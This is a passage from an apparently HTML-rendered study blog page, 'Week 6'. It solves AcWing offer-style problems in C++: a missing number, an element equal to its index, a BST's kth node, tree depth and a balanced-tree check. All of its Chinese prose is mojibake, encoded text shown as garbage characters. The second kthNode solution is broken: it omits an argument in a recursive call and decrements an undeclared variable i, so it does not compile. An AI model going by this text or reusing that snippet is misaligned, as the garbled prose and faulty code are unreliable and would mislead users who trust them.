id="Week-6">Week 6</h1><h2 id="0åˆ°n-1ä¸­ç¼ºå¤±çš„æ•°å­—"><a href="https://www.acwing.com/problem/content/64/">0åˆ°n-1ä¸­ç¼ºå¤±çš„æ•°å­—</a></h2><p>ä¸€ä¸ªé•¿åº¦ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>âˆ’</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">n-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> çš„é€’å¢æ’åºæ•°ç»„ä¸­çš„æ‰€æœ‰æ•°å­—éƒ½æ˜¯å”¯ä¸€çš„ï¼Œå¹¶ä¸”æ¯ä¸ªæ•°å­—éƒ½åœ¨èŒƒå›´ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> åˆ° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>âˆ’</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">n-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> ä¹‹å†…ã€‚</p><p>åœ¨èŒƒå›´ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> åˆ° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>âˆ’</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">n-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> çš„ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> ä¸ªæ•°å­—ä¸­æœ‰ä¸”åªæœ‰ä¸€ä¸ªæ•°å­—ä¸åœ¨è¯¥æ•°ç»„ä¸­ï¼Œè¯·æ‰¾å‡ºè¿™ä¸ªæ•°å­—ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>n</mi><mo>â‰¤</mo><mn>1000</mn></mrow><annotation encoding="application/x-tex">1 \le n \le 1000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1000</span></span></span></span></p><p><strong>æ ·ä¾‹</strong></p><pre><code>è¾“å…¥ï¼š[0,1,2,4]è¾“å‡ºï¼š3</code></pre><h3 id="äºŒåˆ†æ³•">äºŒåˆ†æ³•</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">getMissingNumber</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (nums.<span class="built_in">empty</span>()) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> n_minus_1 = nums.<span class="built_in">size</span>();</span><br><span class="line">    <span class="keyword">if</span> (nums.<span class="built_in">back</span>() == n_minus_1 - <span class="number">1</span>) <span class="keyword">return</span> n_minus_1;  <span class="comment">// ç¡®ä¿èƒ½äºŒåˆ†</span></span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> l = <span class="number">0</span>, r = nums.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">      <span class="type">int</span> mid = (l + r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> (nums[mid] != mid) &#123;</span><br><span class="line">        r = mid;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        l = mid + <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> l;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="æ•°ç»„ä¸­æ•°å€¼å’Œä¸‹æ ‡ç›¸ç­‰çš„å…ƒç´ "><a href="https://www.acwing.com/problem/content/65/">æ•°ç»„ä¸­æ•°å€¼å’Œä¸‹æ ‡ç›¸ç­‰çš„å…ƒç´ </a></h2><p>å‡è®¾ä¸€ä¸ªå•è°ƒé€’å¢çš„æ•°ç»„é‡Œçš„æ¯ä¸ªå…ƒç´ éƒ½æ˜¯æ•´æ•°å¹¶ä¸”æ˜¯å”¯ä¸€çš„ã€‚</p><p>è¯·ç¼–ç¨‹å®ç°ä¸€ä¸ªå‡½æ•°æ‰¾å‡ºæ•°ç»„ä¸­ä»»æ„ä¸€ä¸ªæ•°å€¼ç­‰äºå…¶ä¸‹æ ‡çš„å…ƒç´ ã€‚</p><p>ä¾‹å¦‚ï¼Œåœ¨æ•°ç»„ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mo>âˆ’</mo><mn>3</mn><mo separator="true">,</mo><mo>âˆ’</mo><mn>1</mn><mo separator="true">,</mo><mn>1</mn><mo separator="true">,</mo><mn>3</mn><mo separator="true">,</mo><mn>5</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[-3, -1, 1, 3, 5]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">âˆ’</span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">âˆ’</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">5</span><span class="mclose">]</span></span></span></span> ä¸­ï¼Œæ•°å­— <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>3</mn></mrow><annotation encoding="application/x-tex">3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">3</span></span></span></span> å’Œå®ƒçš„ä¸‹æ ‡ç›¸ç­‰ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p>æ•°ç»„é•¿åº¦ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>1</mn><mo separator="true">,</mo><mn>100</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[1,100]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">100</span><span class="mclose">]</span></span></span></span>ã€‚</p><p><strong>æ ·ä¾‹</strong></p><pre><code>è¾“å…¥ï¼š[-3, -1, 1, 3, 5]è¾“å‡ºï¼š3</code></pre><p><strong>æ³¨æ„</strong>:å¦‚æœä¸å­˜åœ¨ï¼Œåˆ™è¿”å›-1ã€‚</p><h3 id="äºŒåˆ†æ³•-2">äºŒåˆ†æ³•</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">getNumberSameAsIndex</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (nums.<span class="built_in">empty</span>()) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> l = <span class="number">0</span>, r = nums.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">      <span class="type">int</span> mid = (l + r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> (nums[mid] &gt;= mid) &#123;</span><br><span class="line">        r = mid;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        l = mid + <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (nums[l] == l) <span class="keyword">return</span> l;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="äºŒå‰æœç´¢æ ‘çš„ç¬¬kä¸ªç»“ç‚¹â˜…"><a href="https://www.acwing.com/problem/content/66/">äºŒå‰æœç´¢æ ‘çš„ç¬¬kä¸ªç»“ç‚¹â˜…</a></h2><p>ç»™å®šä¸€æ£µäºŒå‰æœç´¢æ ‘ï¼Œè¯·æ‰¾å‡ºå…¶ä¸­çš„ç¬¬ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> å°çš„ç»“ç‚¹ã€‚</p><p>ä½ å¯ä»¥å‡è®¾æ ‘å’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> éƒ½å­˜åœ¨ï¼Œå¹¶ä¸” <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>k</mi><mo>â‰¤</mo></mrow><annotation encoding="application/x-tex">1â‰¤kâ‰¤</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span></span></span></span> æ ‘çš„æ€»ç»“ç‚¹æ•°ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p>æ ‘ä¸­èŠ‚ç‚¹æ•°é‡ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>1</mn><mo separator="true">,</mo><mn>500</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[1,500]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">500</span><span class="mclose">]</span></span></span></span>ã€‚</p><p><strong>æ ·ä¾‹</strong></p><pre><code>è¾“å…¥ï¼šroot = [2, 1, 3, null, null, null, null] ï¼Œk = 3    2   / \  1   3è¾“å‡ºï¼š3</code></pre><h3 id="dfs">dfs</h3><p>å¯¹äºŒå‰æ ‘è¿›è¡Œä¸­åºéå†ï¼Œç»Ÿè®¡åºåˆ—ä¸­ç¬¬kä½æ˜¯å•¥ã€‚</p><blockquote><p>æ‰©å±•ï¼šå¦‚æœæ˜¯æ±‚ <strong>ç¬¬kå¤§çš„</strong>ï¼Œåªéœ€è¦æŒ‰ç…§ <strong>å³ - è‡ª - å·¦</strong> é¡ºåºå»æ‰¾å³å¯ã€‚</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="type">int</span> k_;</span><br><span class="line">  TreeNode *res_;</span><br><span class="line">  </span><br><span class="line">  <span class="function">TreeNode* <span class="title">kthNode</span><span class="params">(TreeNode* root, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">    k_ = k;</span><br><span class="line">    <span class="built_in">dfs</span>(root);</span><br><span class="line">    <span class="keyword">return</span> res_;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(TreeNode *root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!root) <span class="keyword">return</span>;</span><br><span class="line">    <span class="built_in">dfs</span>(root-&gt;left);</span><br><span class="line">    <span class="keyword">if</span> (!(--k_)) res_ = root;</span><br><span class="line">    <span class="keyword">if</span> (k_ &gt; <span class="number">0</span>) <span class="built_in">dfs</span>(root-&gt;right);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ä¸ä½¿ç”¨ç±»çš„æˆå‘˜å˜é‡ï¼ˆæ•ˆæœä¸ <code>å…¨å±€å˜é‡</code> åŸºæœ¬ç­‰ä»·ï¼‰çš„å†™æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">TreeNode* <span class="title">kthNode</span><span class="params">(TreeNode* root, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">    TreeNode *res;</span><br><span class="line">    <span class="built_in">dfs</span>(root, k, &amp;res);</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(TreeNode *root, <span class="type">int</span> &amp;k, TreeNode **res)</span> </span>&#123;  <span class="comment">// &amp; å’Œ **</span></span><br><span class="line">    <span class="keyword">if</span> (!root) <span class="keyword">return</span>;</span><br><span class="line">    <span class="built_in">dfs</span>(root-&gt;left, k);</span><br><span class="line">    <span class="keyword">if</span> (!(--i)) *res = root;</span><br><span class="line">    <span class="keyword">if</span> (k &gt; <span class="number">0</span>) <span class="built_in">dfs</span>(root-&gt;right, k);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="äºŒå‰æ ‘çš„æ·±åº¦"><a href="https://www.acwing.com/problem/content/67/">äºŒå‰æ ‘çš„æ·±åº¦</a></h2><p>è¾“å…¥ä¸€æ£µäºŒå‰æ ‘çš„æ ¹ç»“ç‚¹ï¼Œæ±‚è¯¥æ ‘çš„æ·±åº¦ã€‚</p><p>ä»æ ¹ç»“ç‚¹åˆ°å¶ç»“ç‚¹ä¾æ¬¡ç»è¿‡çš„ç»“ç‚¹ï¼ˆå«æ ¹ã€å¶ç»“ç‚¹ï¼‰å½¢æˆæ ‘çš„ä¸€æ¡è·¯å¾„ï¼Œæœ€é•¿è·¯å¾„çš„é•¿åº¦ä¸ºæ ‘çš„æ·±åº¦ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p>æ ‘ä¸­èŠ‚ç‚¹æ•°é‡ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>500</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,500]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">500</span><span class="mclose">]</span></span></span></span>ã€‚</p><p><strong>æ ·ä¾‹</strong></p><pre><code>è¾“å…¥ï¼šäºŒå‰æ ‘[8, 12, 2, null, null, 6, 4, null, null, null, null]å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š    8   / \  12  2     / \    6   4è¾“å‡ºï¼š3</code></pre><h3 id="é€’å½’å¤§æ³•å¥½">é€’å½’å¤§æ³•å¥½</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">treeDepth</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!root) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">max</span>(<span class="built_in">treeDepth</span>(root-&gt;left), <span class="built_in">treeDepth</span>(root-&gt;right)) + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="å¹³è¡¡äºŒå‰æ ‘â˜…"><a href="https://www.acwing.com/problem/content/68/">å¹³è¡¡äºŒå‰æ ‘â˜…</a></h2><p>è¾“å…¥ä¸€æ£µäºŒå‰æ ‘çš„æ ¹ç»“ç‚¹ï¼Œåˆ¤æ–­è¯¥æ ‘æ˜¯ä¸æ˜¯å¹³è¡¡äºŒå‰æ ‘ã€‚</p><p>å¦‚æœæŸäºŒå‰æ ‘ä¸­ä»»æ„ç»“ç‚¹çš„å·¦å³å­æ ‘çš„æ·±åº¦ç›¸å·®ä¸è¶…è¿‡ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>ï¼Œé‚£ä¹ˆå®ƒå°±æ˜¯ä¸€æ£µå¹³è¡¡äºŒå‰æ ‘ã€‚</p><p><strong>æ³¨æ„ï¼š</strong></p><ul><li>è§„å®šç©ºæ ‘ä¹Ÿæ˜¯ä¸€æ£µå¹³è¡¡äºŒå‰æ ‘ã€‚</li></ul><p><strong>æ•°æ®èŒƒå›´</strong></p><p>æ ‘ä¸­èŠ‚ç‚¹æ•°é‡ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>500</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,500]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">500</span><span class="mclose">]</span></span></span></span>ã€‚</p><p><strong>æ ·ä¾‹</strong></p><pre><code>è¾“å…¥ï¼šäºŒå‰æ ‘[5,7,11,null,null,12,9,null,null,null,null]å¦‚ä¸‹æ‰€ç¤ºï¼Œ    5   / \  7  11    /  \   12   9è¾“å‡ºï¼štrue</code></pre><h3 id="ååºéå†ï¼Œæœªå‰ªæ">ååºéå†ï¼Œæœªå‰ªæ</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="type">bool</span> res_ = <span class="literal">true</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="type">bool</span> <span class="title">isBalanced</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">dfs</span>(root);</span><br><span class="line">    <span class="keyword">return</span> res_;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">dfs</span><span class="params">(TreeNode *root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!root) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> l = <span class="built_in">dfs</span>(root-&gt;left), r = <span class="built_in">dfs</span>(root-&gt;right);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">abs</span>(l - r) &gt; <span class="number">1</span>) res_ = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">max</span>(l, r) + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="ååº-å‰ªæ">ååº + å‰ªæ</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">bool</span> <span class="title">isBalanced</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">dfs</span>(root) != <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">dfs</span><span class="params">(TreeNode *root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!root) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> depth_l = <span class="built_in">dfs</span>(root-&gt;left);</span><br><span class="line">    <span class="keyword">if</span> (depth_l == <span class="number">-1</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="type">int</span> depth_r = <span class="built_in">dfs</span>(root-&gt;right);</span><br><span class="line">    <span class="keyword">if</span> (depth_r == <span class="number">-1</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">abs</span>(depth_l - depth_r) &lt;= <span class="number">1</span>)? <span class="built_in">max</span>(depth_l, depth_r) + <span class="number">1</span>: <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="æ•°ç»„ä¸­åªå‡ºç°ä¸€æ¬¡çš„ä¸¤ä¸ªæ•°å­—â˜…"><a 